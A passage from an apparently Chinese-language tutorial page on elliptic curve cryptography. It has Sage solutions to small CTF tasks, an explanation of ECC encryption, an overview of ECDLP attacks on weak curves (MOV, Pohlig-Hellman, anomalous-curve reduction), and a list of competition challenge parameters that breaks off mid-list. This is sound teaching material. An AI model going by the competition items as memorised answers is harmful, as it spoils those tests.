style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">8</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord">3</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">知</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span></span></p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>P <span class="token operator">=</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Q <span class="token operator">=</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>P<span class="token punctuation">.</span><span class="token function">discrete_log</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre># <span class="token number">11</span></pre></td></tr></table></figure><figure class="highlight markdown"><figcaption data-lang="markdown"></figcaption><table><tr><td data-num="1"></td><td><pre>Jarvis OJ: 简单ECC概念</pre></td></tr><tr><td data-num="2"></td><td><pre>已知椭圆曲线加密 Ep(a,b) 参数为 p = 15424654874903,</pre></td></tr><tr><td data-num="3"></td><td><pre>a = 16546484, b = 4548674875, G(6478678675,5636379357093)</pre></td></tr><tr><td data-num="4"></td><td><pre>私钥为 k = 546768，求公钥 K(x,y)</pre></td></tr><tr><td data-num="5"></td><td><pre>提示：K=kG</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>注：题目来源XUSTCTF2016</pre></td></tr></table></figure><figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>#sage<span class="token operator">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">15424654874903</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">16546484</span><span class="token punctuation">,</span> <span class="token number">4548674875</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>G <span class="token operator">=</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token number">6478678675</span><span class="token punctuation">,</span><span class="token number">5636379357093</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>K<span class="token operator">=</span><span class="token number">546768</span><span class="token operator">*</span>G</pre></td></tr><tr><td data-num="5"></td><td><pre>K<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>#<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">13957031351290</span><span class="token punctuation">,</span> <span class="token number">5520194834100</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="椭圆曲线加密"><a class="anchor" href="#椭圆曲线加密">#</a> 椭圆曲线加密</h2>
<p>根据加法法则，计算 K 很容易但反过来，给定 K 和 G，求 k 就非常困难。因为实际使用中的 ECC 原则上把 p 取得相当大，n 也相当大，要把 n 个解点逐一算出来列成上表是不可能的。这就是椭圆曲线加密算法的数学依据 。</p>
<p>点 G 称为基点（base point）<br />
k (k &lt; n) k (k&lt;n) k (k&lt;n) 为私有密钥（private key）<br />
K 为公开密钥（public key)</p>
<p>下面是利用椭圆曲线进行加密通信的过程：</p>
<ol>
<li>
<p>用户 A 选定一条椭圆曲线 Ep (a,b)，并取椭圆曲线上一点，作为基点 G。</p>
</li>
<li>
<p>用户 A 选择一个私有密钥 k，并生成公开密钥 K=kG。</p>
</li>
<li>
<p>用户 A 将 Ep (a,b) 和点 K，G 传给用户 B。</p>
</li>
<li>
<p>用户 B 接到信息后 ，将待传输的明文编码到 Ep (a,b) 上一点 M（编码方法很多，这里不作讨论），并产生一个随机整数 r（r&lt;n）</p>
</li>
<li>
<p>用户 B 计算点</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>M</mi><mo>+</mo><mi>r</mi><mi>K</mi><mspace width="1em"/><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><mi>r</mi><mi>G</mi></mrow><annotation encoding="application/x-tex">C_1 = M + r K \quad C_2 = r G
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">G</span></span></span></span></span></p>
</li>
<li>
<p>用户 B 将 C 1 、 C 2 传给用户 A。</p>
</li>
<li>
<p>用户 A 接到信息后，计算</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>−</mo><mi>k</mi><msub><mi>C</mi><mn>2</mn></msub><mtext>结果就是点</mtext><mi>M</mi><mtext>。再对点</mtext><mi>M</mi><mtext>进行解码就可以得到明文。因为</mtext><msub><mi>C</mi><mn>1</mn></msub><mtext>−</mtext><mi>k</mi><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><mi>M</mi><mo>+</mo><mi>r</mi><mi>K</mi><mtext>−</mtext><mi>k</mi><mo stretchy="false">(</mo><mi>r</mi><mi>G</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi><mo>+</mo><mi>r</mi><mi>k</mi><mi>G</mi><mtext>−</mtext><mi>k</mi><mi>r</mi><mi>G</mi><mo>=</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">C_1-kC_2 结果就是点M。再对点M进行解码就可以得到明文。
因为 C_1 − k C_2 = M + r K − k ( r G ) = M + r k G − k r G =M
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">点</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">点</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">G</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">G</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span></p>
</li>
</ol>
<p>p 越大安全性越好，但会导致计算速度变慢</p>
<table>
<thead>
<tr>
<th style="text-align:center">优点</th>
<th style="text-align:center">缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">安全性能更高：160 位 ECC 与 1024 位 RSA、DSA 有相同的安全强度</td>
<td style="text-align:center">设计困难，实现复杂</td>
</tr>
<tr>
<td style="text-align:center">处理速度更快：在私钥的处理速度上，ECC 远 比 RSA、DSA 快得多</td>
<td style="text-align:center">如果序列号设计过短，那么安全性并没有想象中的完善</td>
</tr>
<tr>
<td style="text-align:center">带宽要求更低</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">存储空间更小：ECC 的密钥尺寸和系统参数与 RSA、DSA 相比要小得多</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h2 id="椭圆曲线应用"><a class="anchor" href="#椭圆曲线应用">#</a> 椭圆曲线应用</h2>
<h3 id="ecdlp"><a class="anchor" href="#ecdlp">#</a> ECDLP</h3>
<p>​	有限域上椭圆曲线用于建立公钥密码系统，其安全性基于椭圆曲线上有理点加法群离散对数问题（ECDLP）的难解性。目前一般椭圆曲线上的离散对数问题还没有有效的计算方法，而这也是现代密码学中最具挑战性的问题之一。ECDLP 可简要描述为：已知 G 为曲线上的加法子群且 G 的群阶为大素数 r，P 为 G 的生成元。随机选取 G 中元素 R，计算正整数 k 使得𝑅 = [𝑘]𝑃，或者表示为 𝑘 = 𝑙𝑜𝑔p𝑅。目前计算该问题的方法主要包括通用算法和特殊算法</p>
<p>​	那么针对离散对数，因为有限域中的离散对数问题还可用亚指数时间的指标演算法求解，而一般的 ECDLP 目前没有亚指数时间的求解算法，故而它被认为比有限域乘法群中的离散对数问题更加难以求解。</p>
<p>​	所以现在 ECC 上的离散对数常见算法主要有大步 - 小步法、 Pollard’s rho 算法等，而且当参数设定不当时，ECDLP 也会存在一定的漏洞，此时 MOV 攻击可以利用双线性对将 ECDLP 求解转为有限域中乘法群的 DLP 求解</p>
<p>​	如果选择的椭圆曲线有理点的阶等于一些小素数因 子的乘积，那可以用 Pholig-Hellman 算法来求解相应的 ECDLP</p>
<p>通用算法：Pollard's rho 算法（是一种用于分解质因数的算法），Pollard's kangaroo 算法，以及大步小步法（BSGS）等均可用于求解一般有限群上的离散对数问题。目前在一般情况下，计算 ECDLP 也只有通用算法奏效，其时间复杂度为Ｏ（√𝑟）。2009 年 Bailey 等人针对 Certicom 公司提出的 ECC 挑战利用 Pollard's Rho 算法计算 ECC2K-130 上的 ECDLP</p>
<p>特殊算法：在一些特殊曲线上，可以将 ECDLP 转化到其他群上的离散对数问题弱化其难解性，已有研究主要包括：</p>
<ol>
<li>
<p><em><strong>将 ECDLP 约化到有限域上的离散对数问题 (DLP)</strong></em>。如 <em>SSSA 攻击</em> 将异常椭圆曲线 (有理点群阶等于有限域大小) 上的 ECDLP 约化到有限域加法群的 DLP，<em>MOV 攻击</em>则利用椭圆曲线上的双线性映射将定义在有限域𝐹_p 上的 ECDLP，归约到有限域𝐹pk 乘法群上的离散对数问题，此方法在嵌入次数 k 较小时有效。</p>
</li>
<li>
<p>利用 <strong>Weil 下降</strong>等技术将椭圆曲线上的有理点群转化为另一类几何对象 (如<em>超椭圆曲线上 Jacobian 或高维 Abel 簇</em>)，将 ECDLP 复杂性减弱（目前<em>高亏格 HECDLP</em> 存在比通用算法更有效的算法）</p>
</li>
</ol>
<h4 id="举个例子"><a class="anchor" href="#举个例子">#</a> 举个例子</h4>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>#题目来源自第四届（2019）全国高校密码数学挑战赛赛题一-ECDLP.pdf</pre></td></tr><tr><td data-num="2"></td><td><pre>椭圆曲线参数形式为</pre></td></tr><tr><td data-num="3"></td><td><pre>E/F_p: y^2=x^3+ax+b,n:=#E(F_p ),P∈E(F_p),r:=order(P),R∈<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>P</span><span class="token punctuation">></span></span>.</pre></td></tr><tr><td data-num="4"></td><td><pre>求解k,1≤k≤r,s.t.R=[k]P.</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>第一类曲线参数：</pre></td></tr><tr><td data-num="7"></td><td><pre>(1)  p:= 211108170305887; a:=0;b:=7;n:=p;r:=p;</pre></td></tr><tr><td data-num="8"></td><td><pre>P:=( 47815642535808, 116240163507508);</pre></td></tr><tr><td data-num="9"></td><td><pre>R:=( 77983503452527, 143728424564583);</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>(2) p:= 13835058061724614657; a:=0;b:=20;n:=p;r:=p;</pre></td></tr><tr><td data-num="12"></td><td><pre>P:=( 616859655854051956, 12065166484289278801);</pre></td></tr><tr><td data-num="13"></td><td><pre>R:=( 5170466145333976578, 7139090565738339416);</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>(3) p:=906694364778591846139117; a:=0; b:=2;n:=p;r:=p;</pre></td></tr><tr><td data-num="16"></td><td><pre>P:=(475325122433864976165476 ,666857317692667708141096 );</pre></td></tr><tr><td data-num="17"></td><td><pre>R:=(519814743429987512024682, 392414632044199857512746);</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>(4) p:= 59421121885714719481295537269; a:=0;b:=10;n:=p;r:=p;</pre></td></tr><tr><td data-num="20"></td><td><pre>P:=(17547290159953212409742744311, 23276625757393135830641872446);</pre></td></tr><tr><td data-num="21"></td><td><pre>R:=(22782721588122522786532109807, 29566916200346945584248955766);</pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>(5) p:=3894222643901127098494944603540019; a:=0; b:=2;n:=p;r:=p;</pre></td></tr><tr><td data-num="24"></td><td><pre>P:=(3474281736844926688615305014567004, 3343311742974261537268420184037101);</pre></td></tr><tr><td data-num="25"></td><td><pre>R:=(46006664812763786791056435590121, 1631023347800240287678172773820495);</pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>(6) p:= 255211775190703851000955237173238443091; </pre></td></tr><tr><td data-num="28"></td><td><pre>a:=0;b:=32;n:=p;r:=p;</pre></td></tr><tr><td data-num="29"></td><td><pre>P:=(82054120567654459070422632716611948091,</pre></td></tr><tr><td data-num="30"></td><td><pre>208358019881453692582450632924824868211);</pre></td></tr><tr><td data-num="31"></td><td><pre>R:=(54625405255845450735684923869953661538,</pre></td></tr><tr><td data-num="32"></td><td><pre>82751760415032967427013207973543496169);</pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>(7) p:=16725558898897967356385545845388318567564081; </pre></td></tr><tr><td data-num="35"></td><td><pre>a:=0; b:=39;n:=p;r:=p;</pre></td></tr><tr><td data-num="36"></td><td><pre>P:=(15866255640827385375149316462253403735143979, 13637900016555731147592334085022810288787804);</pre></td></tr><tr><td data-num="37"></td><td><pre>R:=(1641844846280313158776293444944029290477363, 1916339757694211104728115095781816602417918);</pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>(8) p:= 1096126227998177188652856107362412783873814431647; </pre></td></tr><tr><td data-num="40"></td><td><pre>a:=0;b:=5;n:=p;r:=p;</pre></td></tr><tr><td data-num="41"></td><td><pre>P:= (83173790821618364013911485269418053634749973470, 331912486564013055335956381322549180967694844964);</pre></td></tr><tr><td data-num="42"></td><td><pre>R:=(163008382252281273947629676562612579052560281605, 50645003441262331054159546612247657430098333396);</pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>第二类曲线参数：</pre></td></tr><tr><td data-num="45"></td><td><pre>(9) p:= 140737488356467; a:=1;b:=0;</pre></td></tr><tr><td data-num="46"></td><td><pre>n:= 140737488356468; r:= 35184372089117;</pre></td></tr><tr><td data-num="47"></td><td><pre>P:=( 59477512413747, 79851403980273);</pre></td></tr><tr><td data-num="48"></td><td><pre>R:=( 125962305399026, 124644987166940);</pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>(10) p:= 9223372036854782251; a:=1;b:=0;</pre></td></tr><tr><td data-num="51"></td><td><pre>n:= 9223372036854782252; r:= 2305843009213695563;</pre></td></tr><tr><td data-num="52"></td><td><pre>P:=(8930887567779448763 , 890632237231967440);</pre></td></tr><tr><td data-num="53"></td><td><pre>R:=( 4707122633993752935 , 3224323188778636920);</pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre>(11) p:=604462909807314587364667;a:=1;b:=0;</pre></td></tr><tr><td data-num="56"></td><td><pre>n:=604462909807314587364668; r:=151115727451828646841167;</pre></td></tr><tr><td data-num="57"></td><td><pre>P:=(587411173575122535454189, 184243119926212298785598);</pre></td></tr><tr><td data-num="58"></td><td><pre>R:=(539012794797204313781763, 513627008874848913042314);</pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>(12) p:= 39614081257132168796771986051; a:=1;b:=0;</pre></td></tr><tr><td data-num="61"></td><td><pre>n:= 39614081257132168796771986052;</pre></td></tr><tr><td data-num="62"></td><td><pre>r:= 9903520314283042199192996513;</pre></td></tr><tr><td data-num="63"></td><td><pre>P:=( 17135037968192446511660916347 , 15756828316532436197954290560);</pre></td></tr><tr><td data-num="64"></td><td><pre>R:=( 14307140364976860571933505517 , 31289859728052046761658770776);</pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre>(13) p:=2596148429267413814265248164627363;a:=1;b:=0;</pre></td></tr><tr><td data-num="67"></td><td><pre>n:=2596148429267413814265248164627364;</pre></td></tr><tr><td data-num="68"></td><td><pre>r:=649037107316853453566312041156841;</pre></td></tr><tr><td data-num="69"></td><td><pre>P:=(622497953272208887929891881018762, 578415484635633376407094129167605);</pre></td></tr><tr><td data-num="70"></td><td><pre>R:=(1641315995010304174750922058961802, 498062680065145119027669812682594);</pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre>(14) p:= 170141183460469231731687303715884123283; a:=1;b:=0;</pre></td></tr><tr><td data-num="73"></td><td><pre>n:= 170141183460469231731687303715884123284;</pre></td></tr><tr><td data-num="74"></td><td><pre>r:= 42535295865117307932921825928971030821;</pre></td></tr><tr><td data-num="75"></td><td><pre>P:=(67561795560749592594257348250381095281 ,132967032564783335773794402620839168397);</pre></td></tr><tr><td data-num="76"></td><td><pre>R:=( 81767392472072972289932811718039895097 , 74483734086357842747707740743879456218);</pre></td></tr><tr><td data-num="77"></td><td><pre></pre></td></tr><tr><td data-num="78"></td><td><pre>(15) p:=11150372599265311570767859136324180753031283;a:=1;b:=0;</pre></td></tr><tr><td data-num="79"></td><td><pre>n:=11150372599265311570767859136324180753031284;</pre></td></tr><tr><td data-num="80"></td><td><pre>r:=2787593149816327892691964784081045188257821;</pre></td></tr><tr><td data-num="81"></td><td><pre>P:=(10280081406291279076050813261615407334758360, 10524832460733629896529554181939223304289725);</pre></td></tr><tr><td data-num="82"></td><td><pre>R:=(1653939556554266819965991031125172966638801, 8370614898071115688249737076845551200138218);</pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>(16) p:= 730750818665451459101842416358141509827966272147; a:=1;b:=0;</pre></td></tr><tr><td data-num="85"></td><td><pre>n:= 730750818665451459101842416358141509827966272148;</pre></td></tr><tr><td data-num="86"></td><td><pre>r:= 182687704666362864775460604089535377456991568037;</pre></td></tr><tr><td data-num="87"></td><td><pre>P:=(221903508784709687556506235376523499020990986034 , 287854209568598432667871196372312232614552000893);</pre></td></tr><tr><td data-num="88"></td><td><pre>R:=( 219270464789952726868617287704232288912801490505, 578348937880270477205296252062048509994911317888);</pre></td></tr><tr><td data-num="89"></td><td><pre></pre></td></tr><tr><td data-num="90"></td><td><pre>第三类曲线参数：</pre></td></tr><tr><td data-num="91"></td><td><pre>(17) p:= 140737488355333; a:=-3;b:=234;</pre></td></tr><tr><td data-num="92"></td><td><pre>n:= 140737484527007;r:=n;</pre></td></tr><tr><td data-num="93"></td><td><pre>P:= (118344265104828, 25754556069705);</pre></td></tr><tr><td data-num="94"></td><td><pre>R:=( 8594518695631, 14966619423525);</pre></td></tr><tr><td data-num="95"></td><td><pre></pre></td></tr><tr><td data-num="96"></td><td><pre>(18) p:= 9223372036854775837; a:=-3;b:=37;</pre></td></tr><tr><td data-num="97"></td><td><pre>n:= 9223372038068412403;r:=n;</pre></td></tr><tr><td data-num="98"></td><td><pre>P:=(7220661838117791356 ,6477969291505257777);</pre></td></tr><tr><td data-num="99"></td><td><pre>R:=( 7819726923954549567 ,6266868167000835108);</pre></td></tr><tr><td data-num="100"></td><td><pre></pre></td></tr><tr><td data-num="101"></td><td><pre>(19) 